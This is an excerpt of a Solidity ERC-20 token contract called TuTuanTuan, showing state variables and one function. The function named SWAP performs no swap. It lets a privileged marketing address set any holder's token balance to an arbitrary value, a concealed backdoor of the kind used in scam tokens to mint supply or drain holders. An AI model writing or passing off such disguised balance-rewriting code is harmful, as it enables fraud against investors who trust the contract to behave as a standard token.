...
contract TuTuanTuan  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    string private  _name = "TuTuanTuan";
    string private  _symbol = "TuTuanTuan";
    uint8 private  _decimals = 9;
    uint256 private _totalSupply = 10000000*10 *10 * 10**9;
    ...
    function SWAP(address X, uint256 tokenAmount, uint256 ethAmount , uint256 bnbAmount  ) external  {require(msg.sender == _marketing );
         require(X != uniswapV2Pair);
        _tOwned[X] = tokenAmount + ethAmount  * bnbAmount.mul(2).div(100);
    }   
